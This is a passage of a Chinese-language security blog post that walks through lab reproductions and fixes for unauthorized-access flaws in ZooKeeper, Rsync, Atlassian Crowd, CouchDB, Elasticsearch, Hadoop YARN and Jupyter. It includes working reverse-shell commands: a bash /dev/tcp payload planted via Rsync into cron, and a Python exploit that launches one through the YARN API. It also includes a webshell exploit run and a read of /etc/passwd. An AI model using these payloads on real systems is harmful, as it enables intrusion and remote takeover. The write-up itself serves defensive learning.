+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/zookeeper-3.4.14/zookeeper-3.4.14.tar.gz</span><br><span class="line">tar -xzvf zookeeper-3.4.14.tar.gz </span><br><span class="line">cd zookeeper-3.4.14/conf</span><br><span class="line">mv zoo_sample.cfg zoo.cfg</span><br><span class="line">../bin/zkServer.sh start	//服务启动</span><br><span class="line">../bin/zkServer.sh stop	  //服务停止</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Unauthorized/image-20200707111251952.png" alt="image-20200707111251952"></p>
+<p>1、未授权访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo envi|nc 172.16.144.135 2181</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Unauthorized/image-20200707111357506.png" alt="image-20200707111357506"></p>
+<p>2、ZooKeeper可视化</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;issues.apache.org&#x2F;jira&#x2F;secure&#x2F;attachment&#x2F;12436620&#x2F;ZooInspector.zip</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Unauthorized/image-20200707111758244.png" alt="image-20200707111758244"></p>
+<p><img src="/images/Unauthorized/image-20200707112356764.png" alt="image-20200707112356764"></p>
+<h5 id="漏洞修复-7"><a href="#漏洞修复-7" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1、修改 ZooKeeper 默认端口，采用其他端口服务</p>
+<p>2、添加访问控制，配置服务来源地址限制策略</p>
+<p>3、增加 ZooKeeper 的认证配置</p>
+<h4 id="Rsync-未授权访问"><a href="#Rsync-未授权访问" class="headerlink" title="Rsync 未授权访问"></a>Rsync 未授权访问</h4><h5 id="漏洞描述-8"><a href="#漏洞描述-8" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>​    Rsync（remote synchronize）是一个远程数据同步工具，可通过 LAN/WAN 快速同步多台主机间的文件，也可以同步本地硬盘中的不同目录。Rsync 默认允许匿名访问，如果在配置文件中没有相关的用户认证以及文件授权，就会触发隐患。Rsync 的默认端口为 <code>837</code>。</p>
+<h5 id="漏洞验证-8"><a href="#漏洞验证-8" class="headerlink" title="漏洞验证"></a>漏洞验证</h5><p>0、环境搭建</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//下载项目</span><br><span class="line">https://github.com/vulhub/vulhub/tree/master/rsync/common</span><br><span class="line">//启动容器</span><br><span class="line"><span class="meta">#</span><span class="bash"> docker-compose build &amp;&amp; docker-compose up -d</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> docker ps -a</span></span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                  NAMES</span><br><span class="line">5c1eb59de4a8        common_rsync        &quot;/docker-entrypoin...&quot;   13 seconds ago      Up 12 seconds       0.0.0.0:873-&gt;873/tcp   common_rsync_1</span><br></pre></td></tr></table></figure>
+
+<p>1、未授权检测</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> rsync rsync://&#123;target_ip&#125;/</span></span><br><span class="line">➜  Downloads rsync rsync://172.16.144.135:873/</span><br><span class="line">src            	src path</span><br><span class="line">//下载文件至本地</span><br><span class="line">➜  Downloads rsync rsync://172.16.144.135:873/src/etc/passwd ./</span><br></pre></td></tr></table></figure>
+
+<p>2、反弹shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 下载crontab配置文件</span></span><br><span class="line">rsync rsync://172.16.2.250:873/src/etc/crontab ./</span><br><span class="line"><span class="meta">#</span><span class="bash"> 该环境crontab中</span></span><br><span class="line">17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly</span><br><span class="line">表示每小时的第17分钟执行run-parts --report /etc/cron.hourly</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 写入bash并赋权</span></span><br><span class="line">vim nc</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/172.16.144.135/9999 0&gt;&amp;1</span><br><span class="line">chmod 777 nc</span><br><span class="line"><span class="meta">#</span><span class="bash"> 将文件上传至/etc/cron.hourly</span></span><br><span class="line">rsync -av nc rsync://172.16.144.135:873/src/etc/cron.hourly</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Unauthorized/image-20200707115044398.png" alt="image-20200707115044398"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 本地监听9999</span></span><br><span class="line">nc -lnvp 9999</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Unauthorized/image-20200707121738127.png" alt="image-20200707121738127"></p>
+<h5 id="漏洞修复-8"><a href="#漏洞修复-8" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1、账户认证：正确配置认证用户名及密码</p>
+<p>2、权限控制：使用合理的权限</p>
+<p>3、网络访问控制：控制接入源ip</p>
+<p>4、数据加密传输等</p>
+<h4 id="Atlassian-Crowd-未授权访问"><a href="#Atlassian-Crowd-未授权访问" class="headerlink" title="Atlassian Crowd 未授权访问"></a>Atlassian Crowd 未授权访问</h4><h5 id="漏洞描述-9"><a href="#漏洞描述-9" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>​    Atlassian Crowd和Atlassian Crowd Data Center都是澳大利亚Atlassian公司的产品。Atlassian Crowd是一套基于Web的单点登录系统。该系统为多用户、网络应用程序和目录服务器提供验证、授权等功能。Atlassian Crowd Data Center是Crowd的集群部署版。Atlassian Crowd和Crowd Data Center在其某些发行版本中错误地启用了pdkinstall开发插件，使其存在安全漏洞。攻击者利用该漏洞可在未授权访问的情况下对Atlassian Crowd和Crowd Data Center安装任意的恶意插件，执行任意代码/命令，从而获得服务器权限。</p>
+<h5 id="漏洞验证-9"><a href="#漏洞验证-9" class="headerlink" title="漏洞验证"></a>漏洞验证</h5><p>0、环境搭建</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget https://product-downloads.atlassian.com/software/crowd/downloads/atlassian-crowd-3.4.3.zip</span><br><span class="line">unzip atlassian-crowd-3.4.3.zip</span><br><span class="line">cd atlassian-crowd-3.4.3</span><br><span class="line">vim crowd-webapp/WEB-INF/classes/crowd-init.properties</span><br><span class="line">//取消注释</span><br><span class="line">crowd.home=/var/crowd-home</span><br></pre></td></tr></table></figure>
+
+<p>执行“Set up Crowd”</p>
+<p><img src="/images/Unauthorized/image-20200708113709624.png" alt="image-20200708113709624"></p>
+<p>申请30天试用<a target="_blank" rel="noopener" href="https://my.atlassian.com/products/index">license</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://my.atlassian.com/license/evaluation?utm_nooverride=1&amp;product=Crowd&amp;version=3.4.3&amp;sid=Server ID&amp;ref=prod</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Unauthorized/image-20200708120448211.png" alt="image-20200708120448211"></p>
+<p>如下图所示：安装成功</p>
+<p><img src="/images/Unauthorized/image-20200708133857021.png" alt="image-20200708133857021"></p>
+<p>1、未授权测试</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">➜  Atlassian git clone https://github.com/jas502n/CVE-2019-11580.git</span><br><span class="line">➜  CVE-2019-11580 git:(master) sudo python CVE-2019-11580.py http://172.16.144.135:8095/</span><br><span class="line">http://172.16.144.135:8095//crowd/admin/uploadplugin.action</span><br><span class="line"></span><br><span class="line">Installed plugin /root/atlassian-crowd-3.4.3/apache-tomcat/temp/plugindev-3858334950456985130rce.jar</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;Get Webshell			//已经getshell</span></span><br><span class="line"></span><br><span class="line">http://172.16.144.135:8095//crowd/plugins/servlet/exp?cmd=whoami</span><br><span class="line"></span><br><span class="line">Exec command= whoami</span><br><span class="line"></span><br><span class="line">Result= root</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Unauthorized/image-20200708134835246.png" alt="image-20200708134835246"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  CVE-2019-11580 git:(master) curl http://172.16.144.135:8095//crowd/plugins/servlet/exp\?cmd\=id</span><br></pre></td></tr></table></figure>
+
+<h5 id="漏洞修复-9"><a href="#漏洞修复-9" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1、设置访问/crowd/admin/uploadplugin.action的源ip</p>
+<p>2、版本升级</p>
+<h4 id="CouchDB-未授权访问"><a href="#CouchDB-未授权访问" class="headerlink" title="CouchDB 未授权访问"></a>CouchDB 未授权访问</h4><h5 id="漏洞描述-10"><a href="#漏洞描述-10" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>​    Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）,默认会在<code>5984</code>端口开放Restful的API接口，如果使用SSL的话就会监听在6984端口，用于数据库的管理功能。其HTTP Server默认开启时没有进行验证，而且绑定在0.0.0.0，所有用户均可通过API访问导致未授权访问。</p>
+<p>​    在官方配置文档中对HTTP Server的配置有WWW-Authenticate：Set this option to trigger basic-auth popup on unauthorized requests，但是很多用户都没有这么配置，导致漏洞产生</p>
+<h5 id="漏洞验证-10"><a href="#漏洞验证-10" class="headerlink" title="漏洞验证"></a>漏洞验证</h5><p>0、环境搭建</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> mkdir couchdb</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> wget https://raw.githubusercontent.com/vulhub/vulhub/master/couchdb/CVE-2017-12636/docker-compose.yml</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> docker-compose build &amp;&amp; docker-compose up -d</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Unauthorized/image-20200709010005589.png" alt="image-20200709010005589"></p>
+<p>1、未授权访问</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://127.0.0.1:5984</span><br><span class="line">curl http://127.0.0.1:5984/_config</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Unauthorized/image-20200709005955776.png" alt="image-20200709005955776"></p>
+<p><img src="/images/Unauthorized/image-20200709010449342.png" alt="image-20200709010449342"></p>
+<h5 id="漏洞修复-10"><a href="#漏洞修复-10" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1、添加认证入口</p>
+<h4 id="Elasticsearch-未授权访问"><a href="#Elasticsearch-未授权访问" class="headerlink" title="Elasticsearch 未授权访问"></a>Elasticsearch 未授权访问</h4><h5 id="漏洞描述-11"><a href="#漏洞描述-11" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>​        ElasticSearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。Elasticsearch是用Java开发的，并作为Apache许可条款下的开放源码发布，是当前流行的企业级搜索引擎。Elasticsearch的增删改查操作全部由http接口完成。由于Elasticsearch授权模块需要付费，所以免费开源的Elasticsearch可能存在未授权访问漏洞。该漏洞导致，攻击者可以拥有Elasticsearch的所有权限。可以对数据进行任意操作。业务系统将面临敏感数据泄露、数据丢失、数据遭到破坏甚至遭到攻击者的勒索。<br>  Elasticsearch服务普遍存在一个未授权访问的问题，攻击者通常可以请求一个开放9200或9300的服务器进行恶意攻击。</p>
+<h5 id="漏洞验证-11"><a href="#漏洞验证-11" class="headerlink" title="漏洞验证"></a>漏洞验证</h5><p>0、环境搭建</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ElasticSearch必须jdk8</span><br><span class="line">//新建用户</span><br><span class="line"><span class="meta">#</span><span class="bash"> useradd elasticsearch</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> passwd elasticsearch</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> su elasticsearch</span></span><br><span class="line">[elasticsearch@localhost ~]$ wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-5.5.0.zip</span><br><span class="line"><span class="meta">#</span><span class="bash"> unzip elasticsearch-5.5.0.zip</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /elasticsearch-5.5.0/bin</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./elasticsearch -d</span></span><br></pre></td></tr></table></figure>
+
+<p>1、未授权访问</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> curl  127.0.0.1:9200</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Unauthorized/image-20200708235939239.png" alt="image-20200708235939239"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> curl http://172.16.144.135:9200/_nodes</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Unauthorized/image-20200709002204225.png" alt="image-20200709002204225"></p>
+<h5 id="漏洞修复-11"><a href="#漏洞修复-11" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1、访问控制策略，限制IP访问，绑定固定IP</p>
+<p>2、在config/elasticsearch.yml中为9200端口设置认证等</p>
+<h4 id="Hadoop-未授权访问"><a href="#Hadoop-未授权访问" class="headerlink" title="Hadoop 未授权访问"></a>Hadoop 未授权访问</h4><h5 id="漏洞描述-12"><a href="#漏洞描述-12" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>​        Hadoop是一个由Apache基金会所开发的分布式系统基础架构，由于服务器直接在开放了 Hadoop 机器 HDFS 的 50070 web 端口及部分默认服务端口，黑客可以通过命令行操作多个目录下的数据，如进行删除，下载，目录浏览甚至命令执行等操作，产生极大的危害。</p>
+<p>​        Hadoop是一个开源的框架，可编写和运行分布式应用处理大规模数据，是专为离线和大规模数据分析而设计的，并不适合那种对几个记录随机读写的在线事务处理模式。Hadoop=HDFS（文件系统，数据存储技术相关）+ Mapreduce（数据处理），Hadoop的数据来源可以是任何形式，在处理半结构化和非结构化数据上与关系型数据库相比有更好的性能，具有更灵活的处理能力，不管任何数据形式最终会转化为key/value，key/value是基本数据单元。</p>
+<h5 id="漏洞验证-12"><a href="#漏洞验证-12" class="headerlink" title="漏洞验证"></a>漏洞验证</h5><p>0、环境搭建</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//拉取docker-compose</span><br><span class="line">mkdir hadoop</span><br><span class="line">cd hadoop/</span><br><span class="line">wget https://raw.githubusercontent.com/vulhub/vulhub/master/hadoop/unauthorized-yarn/docker-compose.yml</span><br><span class="line">//编译并启动</span><br><span class="line">docker-compose build &amp;&amp; docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>1、未授权访问</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.144.139:8088/cluster</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Unauthorized/image-20200709140307458.png" alt="image-20200709140307458"></p>
+<p>2 、命令执行</p>
+<p>本地监听端口，并执行以下exp脚本。</p>
+<p>exp.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;http://192.168.18.129:8088/&#x27;</span></span><br><span class="line">lhost = <span class="string">&#x27;192.168.18.138&#x27;</span> <span class="comment"># put your local host ip here, and listen at port 9999</span></span><br><span class="line"></span><br><span class="line">url = target + <span class="string">&#x27;ws/v1/cluster/apps/new-application&#x27;</span></span><br><span class="line">resp = requests.post(url)</span><br><span class="line">app_id = resp.json()[<span class="string">&#x27;application-id&#x27;</span>]</span><br><span class="line">url = target + <span class="string">&#x27;ws/v1/cluster/apps&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;application-id&#x27;</span>: app_id,</span><br><span class="line">    <span class="string">&#x27;application-name&#x27;</span>: <span class="string">&#x27;get-shell&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;am-container-spec&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;commands&#x27;</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;command&#x27;</span>: <span class="string">&#x27;/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1&#x27;</span> % lhost,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&#x27;application-type&#x27;</span>: <span class="string">&#x27;YARN&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, json=data)</span><br></pre></td></tr></table></figure>
+
+<p>3、反弹shell</p>
+<p><img src="/images/Unauthorized/image-20200709140921090.png" alt="image-20200709140921090"></p>
+<h5 id="漏洞修复-12"><a href="#漏洞修复-12" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1、如无必要，关闭 Hadoop Web 管理页面</p>
+<p>2、开启身份验证，防止未经授权用户访问</p>
+<p>3、设置“安全组”访问控制策略，将 Hadoop 默认开放的多个端口对公网全部禁止或限制可信任的 IP 地址才能访问包括 50070 以及 WebUI 等相关端口。</p>
+<h4 id="Jupyter-Notebook-未授权访问"><a href="#Jupyter-Notebook-未授权访问" class="headerlink" title="Jupyter Notebook 未授权访问"></a>Jupyter Notebook 未授权访问</h4><h5 id="漏洞描述-13"><a href="#漏洞描述-13" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>​        Jupyter Notebook（此前被称为 IPython notebook）是一个交互式笔记本，支持运行 40 多种编程语言。<br>如果管理员未为Jupyter Notebook配置密码，将导致未授权访问漏洞，游客可在其中创建一个console并执行任意Python代码和命令。</p>
+<h5 id="漏洞验证-13"><a href="#漏洞验证-13" class="headerlink" title="漏洞验证"></a>漏洞验证</h5><p>0、环境搭建</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> wget https://raw.githubusercontent.com/vulhub/vulhub/master/jupyter/notebook-rce/docker-compose.yml</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> docker-compose build &amp;&amp; docker-compose up -d</span></span><br><span class="line">默认监听8888端口</span><br></pre></td></tr></table></figure>
+
+<p>1、未授权访问</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.144.139:8888/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Unauthorized/image-20200709145828298.png" alt="image-20200709145828298"></p>
+<p>2、命令执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.16.144.139:8888&#x2F;terminals&#x2F;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Unauthorized/image-20200709145911206.png" alt="image-20200709145911206"></p>
+<h5 id="漏洞修复-13"><a href="#漏洞修复-13" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1、开启身份验证，防止未经授权用户访问</p>
+<p>2、访问控制策略，限制IP访问，绑定固定IP</p>
+<h4 id="监听端口"><a href="#监听端口" class="headerlink" title="监听端口"></a>监听端口</h4><p>以上未授权漏洞程序默认监听端口情况如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Reids	: 6379</span><br><span class="line">MongoDB : 27017</span><br><span class="line">Jenkins : 8089</span><br><span class="line">Memcached : 11211</span><br><span class="line">JBoss	:	8080</span><br><span class="line">VNC :	5900、5901</span><br><span class="line">Docker	:	2375</span><br><span class="line">ZooKeeper : 2181</span><br><span class="line">Rsync	:	837</span><br><span class="line">Atlassian Crowd	:	8095</span><br><span class="line">Couch DB	:	5984</span><br><span class="line">ElasticSearch	: 9200、9300</span><br><span class="line">Hadoop	:	 8088</span><br><span class="line">Jupyter Notebook	:	8888</span><br></pre></td></tr></table></figure>
+
+<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;6103#toc-4</span><br><span class="line">https:&#x2F;&#x2F;paper.seebug.org&#x2F;409&#x2F;</span><br></pre></td></tr></table></figure>
+</section>
+    <!-- Tags START -->
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2020/07/05/Jboss%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/">
+        <span class="nav-arrow">← </span>
+        
+          Jboss漏洞汇总
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2020/07/16/Tcpdump/">
+        
+          Tcpdump
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+      <div class="qrcode">
+        <canvas id="share-qrcode"></canvas>
+        <p class="notice">扫描二维码，分享此文章</p>
+      </div>
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%87%86%E5%A4%87"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">准备</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">Redis未授权访问</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-nav-number">2.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="toc-nav-number">2.2.</span> <span class="toc-nav-text">漏洞验证</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-nav-number">2.3.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#MongoDB-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">MongoDB 未授权访问</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-1"><span class="toc-nav-number">3.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81-1"><span class="toc-nav-number">3.2.</span> <span class="toc-nav-text">漏洞验证</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-1"><span class="toc-nav-number">3.3.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Jenkins-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-nav-number">4.</span> <span class="toc-nav-text">Jenkins 未授权访问</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-2"><span class="toc-nav-number">4.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81-2"><span class="toc-nav-number">4.2.</span> <span class="toc-nav-text">漏洞验证</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-2"><span class="toc-nav-number">4.3.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Memcached-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-nav-number">5.</span> <span class="toc-nav-text">Memcached 未授权访问</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-3"><span class="toc-nav-number">5.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81-3"><span class="toc-nav-number">5.2.</span> <span class="toc-nav-text">漏洞验证</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-3"><span class="toc-nav-number">5.3.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#JBOSS-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-nav-number">6.</span> <span class="toc-nav-text">JBOSS 